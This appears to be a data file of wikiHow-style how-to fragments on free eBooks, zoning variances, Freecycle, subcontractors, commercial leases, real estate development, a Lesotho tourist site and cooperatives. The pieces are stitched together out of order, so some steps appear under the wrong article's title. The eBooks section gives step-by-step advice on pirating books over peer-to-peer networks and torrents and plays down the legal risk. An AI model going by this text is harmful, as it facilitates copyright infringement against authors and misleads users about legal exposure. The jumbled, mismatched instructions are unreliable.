, http://www.freebooksearch.net is a powerful search engine that collects results from Project Gutenberg and hundreds of other sites. If you can't find what you're looking for at Project Gutenberg, Free Book Search is your next best bet.









Search results include the type of download file that's available, if Free Book Search can tell. Not every book is available in every format, but results tend towards widely used formats like PDF and HTML.
This is an excellent way to find older famous books that are still under copyright for free, but search results also often include notes, summaries, or discussions of the book instead of the actual book itself. You may need to dig to find what you want.

, The text archive is a part of the larger Internet Archive, a project to collect and preserve content posted on the web. It has over 4.5 million searchable texts, including many books, old census reports, and other published documents.









The archive is easy to search, but tends towards obscure texts over popular ones. Nevertheless, it's a fascinating source of research material and surprisingly absorbing books you never knew existed.

, More and more libraries are offering eBooks to check out, just like physical copies. This has some disadvantages – most notably, the fact that the library's license only allows a few people to have the book “checked out” at any given time – but it's the best (legal) way to read new eBooks for free. You can usually sign up for the service at your library's website, assuming you've got an account with the library. Once you're in, you can browse the library's selection and download or reserve books directly from the Internet.









Since eBook borrowing is designed to match physical borrowing as closely as possible, you can only have the book for a few weeks before you need to renew or return it. The book will be unusable after the due date otherwise.
The waiting list for a very popular book (such as the latest Game of Thrones title) can be ludicrously long. Fortunately, most libraries will clearly display how many people are ahead of you on the list.

Get free self-published books.",How to Find Free eBooks2," Amazon offers a Kindle-specific library of more than 20,000 public domain eBooks. The iTunes App Store features an app called (fittingly enough) Free Books, which features a hand-curated collection around the same size. Barnes and Noble offer a wide range of free Nook-format short stories, excerpts, and previews (and the occasional whole book) from current authors such as Neil Gaiman and Mary Higgins Clark, as well as many public domain titles.








, Children's Books Online is a repository of public domain children's books, most with illustrations. The books are organized by reading level (there's even a section for adult readers!), and some even have audio files of the book being read aloud. Be aware that the image quality of some of the books is grainy.








, Tor and Baen, two popular publishers of science fiction books, each offer a small library of stories for free to the public. Authors represented at Baen, which offers a few full novels in addition to nonfiction and short stories, include the likes of Poul Anderson and K.D. Wentworth. Tor's website provides original short fiction, updated regularly, but no full books to speak of.








, Harlequin Books, one of the most prolific publishers of romance novels, offers a small handful of full romance eBooks for free. Free-eBooks' Romance category also offers a few romance novels, although they're confusingly mixed into books about picking up girls.








, Smashwords is a self-publishing site for amateur authors. Though there's a lot of chaff on the site, there are also some very solid stories, many of which are available for free. You can browse by category and then adjust results by price to quickly view all the free offerings in any genre.

Know what you're getting into.,
Use a peer-to-peer network.,
Torrent.",How to Find Free eBooks3," In this day and age, the average author makes less money than ever before from book sales. For every J.K. Rowling or Christopher Paolini out there who strikes it rich, there are a hundred, perhaps a thousand authors who scrape out a second income on residuals from their books while paying the bills with an unrelated job. When you pirate a book, more so than in the case of pirated films or music, you're taking money away from the authors (after all, they can't go on tour and charge $10 a head to make up the difference). If you like a pirated book, be sure to go and buy a new copy as soon as you're able.








, Since eBook files tend to be fairly small, one of the most efficient ways to download them is over a peer-to-peer network such as Soulseek or Ares Galaxy. Simply download and install one of these programs (or a similar program) and perform a search for the title or author you want.









Be sure to figure out where the program saves your completed files, so you don't lose track of what you've downloaded.

, You'll need to download a BitTorrent client such as µTorrent first, and then search for a torrent online. Torrent files themselves aren't illegal, so they aren't usually very hard to find. Torrents are a great way to download large bundles of books all at once, but if you're searching for a specific title, you might have less luck. Once you find a torrent file you like, download it and it should open in your client program automatically. Torrenting is generally faster than using a peer-to-peer network.









Once you've finished downloading a torrent, you can choose whether or not to keep sharing it. Sharing it allows other people to download it more easily (and without others sharing their copies, you'd never have gotten yours), but it also puts you at higher risk of getting into trouble for illegally sharing files. Canceling the torrent once you're done is considered bad etiquette in the torrenting community, but that's the only repercussion you'll face if you do it.

Examine your construction plans, and determine if there is any way they can be revised so that a variance is not necessary.,
Familiarize yourself with the local jurisdiction's requirements for a variance.,
Determine what type of variance you need.,
Get your lot surveyed.,
Prepare architectural plans for the proposed project.,
File your application for the variance.,
Notify all property owners within a small radius from your property of your proposed change (the local jurisdiction may actually specify the length of this radius).",How to Obtain a Variance for Your Lot," If you can modify your plans so that they conform to the local zoning ordinances, you will save yourself the hassle of applying for a variance. In addition, you are not likely to be approved for a variance if your plans can be easily changed to comply with the zoning laws.;
, In general, a variance will only be granted if the following 4 criteria are met:


Compliance with the zoning laws would cause undue hardship on the landowner;
The proposed construction is necessary for reasonable use of the property;
The proposed construction would not alter the essential character of the neighborhood;
The proposed construction represents the least intrusive solution possible.

, There are two basic kinds of variances: area and use.


An area variance is required when the configuration of the lot dictates that the zoning regulations simply be relaxed. Common examples of area variances would be exceptions for minimum setbacks from the property line and minimum floor areas.
A use variance is required when the building's intended use will violate the zoning ordinances; for example, a use variance would be required to build an office building in a residential neighborhood. Use variances are much harder to obtain than area variances.

, This is an essential step any time you are planning new construction or an addition. The city or town hall where you will file the variance application will want to see an updated survey, and having a proper survey done will keep you out of legal trouble with neighbors who might object to your use of the land. This is especially important when you are seeking a variance regarding minimum property setbacks.

, Check with your municipality or county to see what level of detail is required. Some jurisdictions may want the plans stamped by a licensed architect or engineer, while others may accept plans you have created with home remodeling software.

, This will generally be performed at your local city or town hall. You will submit your survey, your architectural drawings, a written statement of intent and possibly a separate application required by the jurisdiction.

, You may be required to go to a hearing before your variance is approved, in which all nearby property owners will be allowed to attend and ask you questions. Prepare yourself to field these questions if applicable.

, Select your local area as this is the one you'll be able to collect from/offer within with ease.

, Every group must follow the ""free, legal and appropriate for all ages"" rules, but most have added other rules and some are more relaxed.


Rules often include ""no strings attached"". This includes not allowing ""sob stories"" as part of the reasons for looking for or getting rid of items because people must freely give away or seek things and not pressure others with emotional levers.
There may be rules about taking free items for resale. Some people resell the items they've been given for free and this upsets those giving them away freely if they aren't told up front. You may need to disclose this as your intention.

, All of the posts will come to you through an email group of one kind or other. You can have an email update as soon as an item is listed but this will probably overload your in-box, especially if your local Freecycle is very active. Or, you can ask for regular digests that summarize the giveaways for the day. You always have the option of reading all posts directly on the web.

, In order to make the most of your experience, you'll need to know what the item offer means. In a nutshell:


Offer - this means someone is offering this item for free. If it sounds like something you're interested in, write the person back directly to their personal address, not to the group list. The one who makes the offer gets to choose who will be the recipient of the item.
Wanted - this means someone is searching for a particular item. Maybe you've got this stored in the attic, basement, or back of the closet. Want to get rid of it? Now is your chance. When you have an item you're looking for, you can post a Wanted requesting that item.
Taken - this means the item that was offered has been taken. It is posted by the person who offered the item.
Admin - occasionally you'll see the heading ADMIN. This is a message from the moderator that you need to be sure to read. It will often update you on small changes or it may draw attention to behaviors that have occurred that need to be changed/stopped or minimized (such as making demands on people like asking them to deliver a free item, etc.).

, When you see an Offer that interests you, get in quickly. While there is no rule that the first past the post wins the item, those giving away often want the item removed quickly, so being fast to claim makes good sense. When emailing for the Offer, consider the following:


Be polite. If you use ALL CAPS, make derogatory remarks about the item, fail to connect with the person as a fellow human being, you're a lot less likely to win the freebie than someone who is polite. Address the person politely, be nice about the freebie and remember that this person is being generous.
Explain your reason for wanting the item. An email that says something like ""Yeah, I'll take it thanks"" doesn't tell the person giving away very much and if you're competing with others, such a message may well lose you the chance. Give a brief explanation of why you'd like the item. For example, ""I'd love those lamps because I have a problem reading at night with just an overhead light and I'd really like to curl up on the couch under a cozy lamp to read.""

, The one who posts the Offer usually decides the method for picking up the item (usually it's pick-up but sometimes you can get the item delivered, depending on the simplicity of doing this).


Keep your personal safety in mind throughout every ""transaction."" It is often a good idea to take someone else with you, especially if you don't know the area or you've not connected with the donor before.
Equally, don't crowd the donor or assume that their generosity extends beyond the item. If they ask you inside or even offer a cup of coffee, that's great but never insist on either.
Be subtle if you want to find out if there is anything else they might have, like saying ""I am collecting lots of these horse figurines, so if you know of anyone else who has some they don't want anymore, please do let me know if it's not inconvenient."" Just because you see a pile of the horse figurines on their kitchen table doesn't mean the rest are freebies, so avoid probing.
Avoid bossing the donor around. If the donor cannot see you at a time that suits you, then consider another time that is mutually acceptable.

, Yes it's a freebie but you've made a deal to collect it. Don't renege on turning up just because you can't be bothered and the thing is ""just for free"". There are rules about how often an item can be reposted and for some Groups there is a delay of a few weeks before the person can relist an item they've stated as ""Taken"", so if they had noted this in anticipation of your collection, they're stuck with the item for longer. Set a pick-up time you know you can make and be sure to turn up.


Turn up on time. It is rude to make people wait when you've set a time; the donor is being generous as it is and has plenty of other things to be getting on with than waiting for you.
You can ask for items to be left outside but respect the donor's wishes on this. In some cases, leaving stuff out for collection is an invitation for theft or it might get wet in the rain, etc. If a donor doesn't want to do this, don't push for it.

, The idea of Freecycle is to share things around. It is not at all uncommon for you to be a donor and a collector all in the same day; be sure you keep the virtuous cycle of reusing goods turning by offering the things you no longer need too.

, Almost anything can be offered. Old windows, rocks, dirt, cabinets, clothes, pets, old magazines, even kitchen sinks! No item is too big or too small-crafters can use small broken jewelry, junkers will take big old pieces of metal from the back of the farm...

,, If the site allows images, consider uploading one but this is optional. If the item has anything you think people should be aware of, include this. For example, you might want to point out if the item needs a good dust, clean or needs repair, etc.


Note that the following things are often not permitted as part of an Offer post: Phone numbers, requests for borrowing/lending, web links, public notices, urgent/desperate calls for help, fundraising events, general questions, etc. This will vary depending on your location.
Freecycle is not a place for bartering, exchanging, making deals or borrowing. Freebies must come with no strings attached.

, Then wait for requests. These are likely to begin quickly, as some people watch the new items being listed all the time. Some things to bear in mind:


It's a good idea to wait for a few emails to arrive. That way, you can make a choice as to who will gain the freebie from the way they've asked for it. There is no rule that says you have to accept the first person's request. Go with the reply you feel is right.

, Provide your address and any quirks about getting to your place. Offer a phone number in case they get lost. And ask them to let you know when they can make it. If you're in a hurry to offload the item, stress this.

, If the person fails to come, make up your mind whether you'll keep it for them or pass it on to another person who requested it. This is a freebie, so there is no need to keep it back if the person collecting fails to show up.

, This alerts others on the list that they won't be able to ask for it any longer.

Electricians. They install the wires which are hidden from view. They also install fixtures, devices, and electrical switches.
Masons. They can build anything involving blocks or bricks, such as block foundations, retaining walls, and walkways or patios.
Framers. They build the shell on top of the foundation using lumber, trusses, and other sheet materials.
Roofers. Roofers prepare the roofing surface by preparing the underlay and then installing the roofing material on top.
Siding contractors. They install the siding on the outside of the building and can handle exterior trim.;
, You can find a subcontractor by asking people who have had work done if they would recommend the person who did it. For example, someone in your neighborhood might have had electrical work performed or had a new roof installed. Ask for the name of the person who did the work.


If you see a house being built, you can stop in and talk to the contractor. Ask who he or she has working as subcontractors.You can also ask retailers. To find a plumber, ask the retailer that provides supplies to the plumbers in the area. If you are looking for someone to lay tile (a tiler), then ask the tile supplier in your area.

, Once you have the names of several subcontractors, you can solicit bids from them. Make sure that you give them a written description of the job they are bidding on. Include drawn plans and clear written specifications.Request the bid in writing. If possible, have the subcontractor provide an itemized bid, in which they estimate how much they will charge for supplies and labor.

, Your first instinct might be to pick the person who offered the lowest bid. There is no reason to follow this strategy. In fact, picking the person with the lowest bid could work against you.


If the subcontractor’s bid is too low, then they might not complete the job. When the money runs out, they might abandon the project rather than spend their own money to complete it.Although you can sue the subcontractor for abandoning a project, lawsuits cost time and money.

, You want the sub to provide sufficient information about their volume of work and average job size.You are looking for a “good fit,” i.e., someone who handles projects similar in size and scope as yours.


A subcontractor who typically handles larger projects might not take your project as seriously.
Alternately, a subcontractor who usually works on smaller projects could become overwhelmed and do a bad job.

, For example, you might want to request audited financial statements. You can request this information, particularly if you have a very large job.Ask if the sub has ever declared for bankruptcy or if they have ever worked under any company that has.

, To get a sense of the quality of work, you should search whether the sub has been sued before.You can ask the subs in their bids to disclose this information. However, you might be worried that they won’t reveal every lawsuit.


You can also search on your own. For example, if you know where the subcontractor’s business is located, then you could go to the courthouse in that county and search for court records. Court records are generally public. See Research Court Records for more information.

, You can search the Internet to find if anyone has made complaints. Search Yahoo, Google, or Yelp. Remember that anyone can complain online, so take complaints with a grain of salt. However, the information you find on the Internet can be helpful.Check with more credible sources as well. For example, you can ask the subcontractor for references. Then you can call the references and ask how happy they were with the sub’s work.
You can also ask material suppliers or other contractors if they would recommend the subcontractor.

, You want to hire a safe subcontractor, so you should ask that safety information be provided with the bid. For example, you should request the following information:


Whether OSHA has ever inspected the sub. If so, ask for a copy of the inspection report. You can also search the OSHA website to double-check whether a sub has been inspected.You should ask for the sub’s Worker’s Compensation records and check for the Experience Modification Rate (EMR).The EMR loss ratio is calculated by comparing how much the company paid out in worker’s compensation claims as compared to other businesses of equivalent size in the industry. The higher the rate, the worse the company’s safety record.
Ask for a copy of any formal safety program that the sub runs.

, After reviewing the relative price, experience, and reputation for each bidding subcontractor, you should make a selection. You can notify the subcontractor over the phone that you are interested in hiring them.


Tell the sub that you need to confirm that they are licensed and insured before you can sign a contract.

, The subcontractor should be willing to share with you copies of their applicable licenses. Once you receive a copy, you should confirm with the state that they are licensed.You can confirm that someone is licensed by contacting your state’s licensing or permitting agency.
Some states may have an online tool you can use to verify someone’s license., The sub should also give you proof of insurance. Make sure that the coverage amount is adequate. As a general rule of thumb, a sub should have as much coverage as you do. A subcontractor should maintain the following insurance policies:worker’s compensation insurance
general liability insurance
vehicle insurance (possibly)

, You need to sign an agreement with the subcontractor before the sub begins work. You can have a lawyer draft an agreement for you, or you can use the standard form that was created by three contractor associations (the ASA, AGC, and ASC). You can get a copy of the form by contacting one of the three associations:American Subcontractors Association, Inc., 1004 Duke Street, Alexandria, VA 22314-3588. You can call 703-684-3450.
Associated General Contractors of America, 2300 Wilson Blvd., Suite 300, Arlington, VA 22201. You can call 800-242-1767.Associated Specialty Contractors Association, 3 Bethesda Metro Center, Suite 1100, Bethesda, MD 20814. You can call 301-657-3110.

, You should keep the original and a copy in your records. Give the subcontractor a copy of the contract as well. The client might also want to see copies of your contracts with subcontractors, so make a copy for the client if requested.

Search on social media.,
Check your local hangouts.,
Ask family and friends.",How to Find a Local Freecycle Group2," Social media platforms, such as Facebook, Twitter, and Instagram can also provide a resource to locate your local freecycle group. Each platform has its own search inquiry that allows you to find pretty much anything, including groups that do freecycling. If you are not signed up for social media, you can still search on Facebook and Twitter for a local freecycle organization without having to register and create an account.


While Instagram and Twitter can be used to find a group for freecycling, Facebook would prove to be the most effective and user friendly for finding one. Facebook allows the user to do a direct search for local groups while Twitter and Instagram may present more of a challenge. Both Instagram and Twitter use symbols (hashtags “#” and at symbols “@”) to connect people together all around the world, thus making it more difficult to find a local organization to join.

, Coffee shops, libraries, and other local places oftentimes have bulletin boards where they hang up news and announcements ranging from when the next town hall meeting will be to advertising the next toastmasters meeting. Browse through the flyers there and see if you find an advertisement about your local freecycle group.


For example, Starbucks coffee shops have bulletin boards near either the restrooms or the coffee making station. They post announcements of local events pretty often.

, Your friends and family may know of a local freecycle group that they are familiar with by their own use or they may know people who use one. Family and friends can be a valuable resource and can point you in the right direction.


For example, you could ask your neighbor, who you know is a dedicated recycler, if they know of a freecycle group. You could begin the conversation with, “Hey Mary. I’ve been thinking of getting rid of my old couch, and while I want to replace it, I know it could still get some good use out of it. I would hate for it to go to a landfill. Do you know of any local freecycle groups I could post it on so I can give it away?”

Sign up.,
Expect an e-mail.,
Enjoy.",How to Find a Local Freecycle Group3," Once you have found the freecycle organization you want to work with, you’ll need to join a local group.

, On the main webpage for the organization, you will need to enter in your city and state. It will direct you to a page listing all the areas within your city. Select your city preference.


For example, if you live in Houston, Texas, type that in the search bar and it will direct you to your city and all the surrounding cities near Houston.

, Once you have entered your location, and clicked on your preferred area, you will see a listing of all the different items being offered and/or requested. However, before you get to plunge in and go treasure hunting, you’ll need to create an account.


You’ll sign up with an email address and a username. Be cautious about signing up with your own personal email address, as you will get flooded with an enormous amount of notifications about free stuff. It may be beneficial to create an email address just for the purpose of doing freecycle., After you've joined a group, you'll get an e-mail with information explaining how they work. You have the option of receiving notifications as new items are posted, or opting out of notifications and just checking the website periodically.If you’re interested in getting a lot of free stuff, you may want to sign up for email alerts. New stuff goes fast and if you wait later to check the site, you may be too late., After you’ve successfully found your local group and registered with the website, start browsing for stuff being given away.


As good as it feels to always receive; try posting your own unwanted items as well. You never know if your trash is another person’s treasure.

Discuss time and rent.,
Discuss added or included expenses.,
Discuss any initial modifications to the property.,
Discuss maintenance and repairs.,
Discuss insurance.,
Discuss default and termination.",How to Negotiate a Commercial Lease2," You should determine the amount of time the lease will be in effect and the amount of rent to be paid in particular intervals (monthly, annually, etc). Included in this should also be any scheduled rent increases and lease extensions or termination clauses. Landlords tend to want stable long-term tenants, while new and small businesses generally should negotiate for short-term (one- or two-year leases) with the ability to renew without steep rent increases. Common rent structures include:Gross Rent - the most common and is a fixed monthly amount and the landlord is responsible for all expenses of operating the building including taxes, repairs etc.
Net Leases - require the tenant to pay for some or all of the real estate taxes in addition to their base rent.
Net-Net Leases - require the tenant to pay for some or all of the real estate taxes plus the insurance on the space they are occupying.
Net-Net-Net or Triple-Net Leases - are usually written only for industrial properties and basically pass on all costs of operating the building to the tenant.
Percentage Leases are a type of rental arrangement that applies to retailers. In a percentage lease the tenant pays a base rent plus a percentage of gross income. Rent may go up and in that case it is outlined in the escalation clause of the lease agreement.

, Frequently, there are additional charges for maintenance of shared facilities (such as parking lots) and utilities that are provided by the property owner (such as dumpster rental and trash disposal). Be sure you know what additional items you are responsible and what is included in your rent. If utilities are billed to you by the property manager, be sure you know if these are individually metered for the area you are leasing or if they are apportioned by square footage or other metric. Ask the property manager to disclose all fees you will be expected to pay to the landlord., Some properties offer “build-out” options in which the property manager will make certain modifications to accommodate the needs of the tenant. Often this will result in an increased rental price per square foot. These may include adding or removing walls, laying carpeting or tile, or installing particular lighting treatments. If the property doesn’t offer build-outs, be sure you will be able to hire outside contractors to make any modifications you will need., In many commercial leases, the tenant is responsible for maintenance and repairs to all except common areas. Be sure you know who is responsible for maintaining and repairing:Roof
Walls, doors, and windows
Electrical systems
Plumbing systems
Other fixtures and appurtenances to the property

, Aside from insuring your business furnishings and equipment that are to be located inside the property, many commercial property managers require the tenant to carry a policy to cover the building in the case of destruction caused by the tenant or their clients and guests. Contact insurance providers to see how much that coverage will cost.

, In some areas, failure to pay your rent on a commercial lease can result in an immediate lock-out. This could be devastating to your business. You should clearly negotiate what happens if either party does not perform the lease as expected. A few questions you will want to consider are:What will happen if the property is not vacant or ready for move-in on the date the tenant is to take possession?
Will there be a grace period for the tenant to pay the rent plus late charges?
Can the tenant deduct from the rent the cost of making repairs that are the landlord’s responsibilities?
If either the tenant or the landlord decide they want to terminate the lease prior to the date negotiated initially, can the tenant sublease the property, what will be the procedure, and how will any damages be calculated and paid?

If the landlord provides a form lease, review it for all terms. Have your attorney review it if you have any questions. Ask for changes if the written lease does not reflect your oral agreement. If you are writing your own lease, you can find sample commercial leases by searching for commercial leases in your state online. Since landlord/tenant and contract law are state laws, be sure the sample you use has been written specifically for use in your state., A lease for greater than one year must be signed by all parties to be enforceable. Even for a lease of less than one year, a signed lease is higher proof of the agreement than simple testimony., If a disagreement arises, the courts will likely require a copy of the contract signed by all parties to be filed with the court.

",How to Develop Commercial Real Estate,"


The kind of businesses you lease or sell the property to will all have their own set of demands for the property, and you must be able to cater to that market by providing the right location, trustworthy contractors, and efficient property management.
The most common types of commercial real estate you can develop are office buildings or office parks, industrial and warehouse real estate, and retail centers. Within each category there are a number of standard developments that may or may not be right for the type of commercial property you want to develop.;
,


You need to do some careful planning before you jump into any type of property dealing. Even though plans can go wrong at times, proper planning from the start will help you to ascertain success. Do some research about the area you have plans on buying a property. Ask the locals in the area about its accessibility and certain problems that you need to be aware of.

, This can be in the form of a business loan, investments by investment companies or private investors, or a combination of both.

,


You can find out how a lot is zoned by checking with your city's zoning and planning division.
Make sure the location allows for easy access for the traffic that will be attracted by the new development.
Find out what other development and infrastructural plans exist for the area. For example, if a new highway is planned, it will allow for more traffic, which could be beneficial for the commercial property, but if existing commercial real estate is going to be demolished to create a park or residential buildings, this could adversely affect the attraction of your commercial development.

,, Also secure any permits you need to develop commercial real estate. Depending on the location, this can include construction permits, parking permits, and waste removal permits.

, Make sure to explain clearly what your needs are in terms of budget, time, and building requirements.

,, Request weekly and monthly reports from both the contractors and the architect overseeing the project so you're aware of the progress.

, These are usually performed by a city agency that dispatches inspectors to investigate whether commercial real estate is in compliance with legal requirements.

Identify the place or site that you want to develop into a tourist attraction.,
Research about the potential site thoroughly.,
Plan the management of the site and register the group with the law office.,
Solicit support from the relevant government departments.,
Seek allocation of the site from all relevant local community responsible bodies.,
Write the concept paper for funding.,
Write the proposal for funding.",How to Build a Tourist Attraction in Lesotho," It is very easy to identify the sites with the potential to attract tourists because more often than not hard-eco tourists (they are adventurous travellers who like to visit the undiscovered places because they enjoy the challenge of visiting not easily accessible places where there are no tourist facilities and other components of a destination such as tarred roads, cell phone networks and other services that are not available if the site is not yet developed) might already be visiting the place or if there are no visits already, you may consider increasing potential tourists awareness about it.;
, Every site having the potential to attract tourists other than the wetlands area infested with flora and fauna has history behind it. Be familiar with the problems that are facing the site by analysing the prevailing situation. If there are environmental problems that are rife in the area, destructive human and domesticated animals interacting with the site, and some delicate historical remains that need to be preserved for the future generation to use will be the recommended facts to find out in your research. Asking the locals who might know the history of the site open ended questions will give you enough information about the older initiatives undertaken by the local people that have failed and the important information you might not know about the site

, At least 60% of the site management should be the community people as many relevant stakeholders such as international organisations have interest in funding the projects that improve the community livelihood not an individual who is aiming at profits. To succeed in this kind of business you must have a need for social responsibility and have the goal to change lives. Involving the community people in the management is very legitimate at diluting the negative attitudes that make some people resistant to change, and who might be aiming at destroying the developments made in the potential site. Then after you have decided on the management group register with the law office

, To succeed in the process of funding, first you must consult with the relevant government departments. If there are environmental problems, then approach the Department of Environment. If it’s the history or the physical evidence with the cultural significance then consult with the Department of Culture. The relevant Department will site visit the place for documentation (take photos, videos and interview a few locals to get the site information) and file the information obtained during the process because that will be helpful in backing up the proposal of the funds for development in the later steps

, Consider approaching the local chieftainship, local community council, if the project is in Maseru town consult with the city council, and most importantly the local people in their groups for the support of the project. That will add credibility for the project success and the Donors will have confidence the project is going to succeed to the acme of its perfection. The relevant bodies should site visit the place and be given all the relevant information that will increase the interests, then they should all make the written documents that prove the site is allocated ideally for the project to be initiated and the documents will also be needed to back up the proposal for the funds but for now they should all be presented to the chosen Department as the prove of the allocation

, If all needed information is acquired about the targeted site then write a concept (preliminary paper that describes the site and the estimated budget) to the Donor. This is a critical step that would decide whether the project passes or fails to obtain funds and note that many projects fail because they do not meet the objectives of the Donor. If it’s biodiversity conservation, state it here. If it is something concerned with cultural heritage again state it. Another important thing to note when drafting a concept is to state the problems faced by the site and the threat to its existence then the proposed interventions to mitigate the destruction. Hundreds of concepts might have been submitted and only the best that meet the objectives and the required standard will be selected so make sure you are at your level best

, After the concept has been approved by the Donor, write the detailed proposal that gives the account of the detrimental activities in the site and the proposed activities to be undertaken in the development process. Give the detailed accounts and be creative in the process because writing the proposal is the most important of all and there is still a chance that the project will fail if the required standard and the objectives are not met. There are several steps that need to be qualified until the proposal is final and qualifies for the funding and it takes devotion of time and energy to succeed in this, so apply yourself.

At this time, you also should encourage these people to recommend others who they think might be interested in joining in on the project in its planning stages.;
, Like any business, your cooperative should be formed to meet a compelling economic need in your community. The more compelling the need is, the more likely your cooperative will be successful.At its core, cooperatives respond to some need in your community, or exploit an opportunity that is available in your area. For example, you might want to start a co-op garden to provide fresh produce to people living in an inner-city community.
If you're having trouble finding the need that your cooperative could address, consider connecting with a cooperative development program in your area.
Many nonprofit organizations and universities have programs or departments that are dedicated to cooperative development.

, Expect the initial meeting to consist mainly of a discussion of the advantages and disadvantages of a cooperative, and how the cooperative you have in mind could address the need or problem you've identified in your community.If you've decided to start a co-op garden, for example, you might point out the lack of fresh produce in grocery and convenience stores in the immediate area.
The garden also would have important educational and environmental benefits for the people in the community, particularly children.
It may be a good idea to bring in an advisor or cooperative expert to talk during your initial meeting and answer questions anyone might have.
You'll also want to discuss the basics of how the cooperative will be organized, what financial contribution (if any) will be expected, and create a general timeline to get the cooperative off the ground.
Keep in mind that it can take up to a year to get a cooperative up and running. One of the most important aspects of cooperative development is strong, well-researched plans. You also want to create a dynamic organization full of passionate, committed people.

, The steering committee will be the group of people who works on the business planning for the cooperative and its incorporation. The committee members thus should be people who have experience in business and law.If at all possible, try to have at least one person on your steering committee who has previous experience developing or operating a cooperative. Their knowledge will be invaluable.
If you've already connected with a cooperative development program near you, they may be able to recommend someone who is willing to serve in this capacity.
You also want someone with general knowledge and experience in business start-ups and development, as well as an attorney or someone who has a broad understanding of business and corporate law.
Keep in mind that the members of your steering committee probably will end up being the cooperative's first board of directors. Make sure those chosen are passionate and committed to your cause.

, Over the course of your cooperative's development, it's important for all of your initial organizers, including but not limited to the steering committee itself, to meet frequently.You can plan on sending periodic emails or other correspondence, but these are no substitute for everyone meeting in person on a regular basis.
During the planning stages, it's important to ensure nobody feels they are left out of the loop. If anyone in your initial group loses interest or becomes alienated from the process, the co-op may fail.
Getting everybody together also enhances the democratic nature of co-ops and allows you to field ideas from diverse sources that may not otherwise be considered.

, A feasibility analysis is a broad term for a planning report, including member-use analysis and market analysis, that will ground the overall business plan for the cooperative.The steering committee typically is in charge of conducting this feasibility analysis. Depending on the background and expertise of the committee members, they may want to bring a professional business analyst on board.
Cooperative development programs run through a university or nonprofit organization also can provide assistance and resources necessary to conduct a feasibility analysis.
The point of these reports is to determine the needs of potential members, the anticipated business volume, and where the cooperative's goods or services would fit into the local market.
The feasibility analysis also should evaluate possible locations for the cooperative, and methods for delivering the co-op's products or services to its members.

, After the feasibility study is complete, the steering committee will be responsible for drawing up a comprehensive business plan for the cooperative. One of the first parts of the business plan should describe what the co-op will do and why.Primarily, you should use this section to describe the community need you have identified, and how the cooperative would address that need.
Describe the activities of the cooperative specifically, as well as its business objectives and how the two tie together.
For example, if you're creating an agricultural cooperative, you would go into detail about the types of crops you planned to grow, the people who would help at various stages of production, and how the crops eventually would be divided among the members.
You also might go into detail about whether the crops would be available to the public, and the prices you'd charge to the general public versus members of the cooperative.

, The business plan should name and provide contact information for each of the members of the steering committee, as well as any other members of the initial group that will play a key role in the cooperative's development.In this section, you also should identify anyone who will play a significant role in the day-to-day operations of the co-op, including managers, directors, or foremen who will oversee production or the delivery of services.
If you have anyone selected – either as a member of the steering committee or otherwise – who will provide legal or accounting services to the co-op, they should be listed separately.
Provide background information about each of the people listed that is relevant to their position in the co-op leadership.

, One of the most important parts of the business plan is the discussion of how much the cooperative will charge for its goods or services, and how it will bring those goods and services to the people in your community.Much of your content here will be based on the results of the feasibility analysis the steering committee conducted.
However, you also should plan on attaching the results of any feasibility or marketing studies you've completed to the business plan as well, making them a part of the overall package.
Provide information on how you plan to position your products or services in the marketplace, as well as any member recruiting strategies or marketing plans that have been devised.

, Cooperative businesses have diverse structures. Your business plan should lay out how you plan to run the cooperative, how decisions will be made, and who will be in charge on a day-to-day basis.In this portion of the business plan, you will detail any manufacturing or service delivery plans you already have in place.
If these plans are still in development, explain what stage those plans are at and when you anticipate moving to the next stage.
If any equipment or land must be purchased to move your development forward, explain that as well and then include those costs in your section on funding.
Your operations section also should include any information about staff or training you plan to provide. If you're using resources from a cooperative development project nearby, list the name of the cooperative development project and the resources they're providing.

, Start-up capital is one of the biggest hurdles cooperative businesses face. Your business plan needs a frank assessment of the cooperative's financial needs, and how you plan to meet those needs.If any of the initial members, or members of the steering committee, will be investing any start-up capital, this should be listed in your funding section.
If you have any fundraising plans, include an outline of those as well. For example, you may have decided to use an online crowdfunding site to raise money for the co-op.
You also may have evaluated loans from banks and other lending institutions, or grants from nonprofit organizations or government agencies, to meet your funding needs.
If you've decided to meet your funding needs by selling stock in your cooperative, explain your plan and how you anticipate setting up the offer. You'll also need to describe any legal issues involved, such as securities regulations that might apply to your offer.

, The ultimate goal of a cooperative, apart from advancing the values that motivated its creation, is to make money for its members. Your business plan should include conservative projections of how much profit the cooperative will make in its first years.These projections typically will come from the feasibility analysis the steering committee conducted.
It's important to keep your projections conservative, especially in your first years of operation. Keep in mind that most cooperatives do not make a substantial profit in their first years.
Your projections also will depend on the type of co-op you're trying to set up. For example, if you want to set up a co-op garden in an inner-city neighborhood, substantial profit may be secondary to other community benefits such as education and investment in the community and its people.

, If you intend to incorporate your cooperative, you must come up with a unique business name. Check with the secretary of state's office in the state where you plan to open your cooperative.The secretary of state typically will have a business name database. You also may be able to search this database from the secretary of state's website.
Check your state's regulations regarding what words must be included in your name. If you're incorporating, the name must be followed by ""Inc.""
Your state also may require you to include the word ""cooperative"" in your business's name. Even if it isn't required, it makes good business sense to include it.
Keep in mind that your name must not only be unique, but also not similar to the name of any other business in your state.

, Unless you already have an attorney on the steering committee, or otherwise involved in the formation of your cooperative business, you typically want to hire one to help you draft your corporation documents.Keep in mind that corporate law can be fairly complex, and the procedures differ from state to state.
If you already have an attorney on your steering committee, they can complete the paperwork the co-op will need.
However, if you need to hire someone, try to interview two or three attorneys. Make sure the attorney you choose has the approval of the entire steering committee.

, The articles of incorporation is a legal document that formally organizes your co-op as a corporation. This document must be drafted with specific sections established by your state's law.If you've decided not to hire an attorney and don't have one working with the co-op, you may be able to find a form or template online that you can use to draft the articles of incorporation.
Since state laws differ, make sure any form or template you use is approved for use in your state.
Generally, the articles will establish the name, location, and purpose of your cooperative and its date of incorporation.
It also will list and identify the roles of the incorporators – typically the members of your steering committee.

, The bylaws are the organizational rules by which your cooperative will operate, including the procedures by which you will make and implement decisions. Your state's law may dictate particular issues that must be addressed in your bylaws.Keep in mind that while bylaws are not required by law, if you do have them they must comply with the guidelines established in your state's corporate law.
This document essentially describes the rules by which your cooperative will run. This includes membership duties and requirements, responsibilities of various board members or other management roles, and operating procedures.
You also may include rules related specifically to board operations, including when various reports are due, how a board member can be removed, and how issues can be put to a vote.
The steering committee will need to meet to approve the bylaws and vote on the corporation's first board of directors. Typically these individuals are drawn from the steering committee itself.

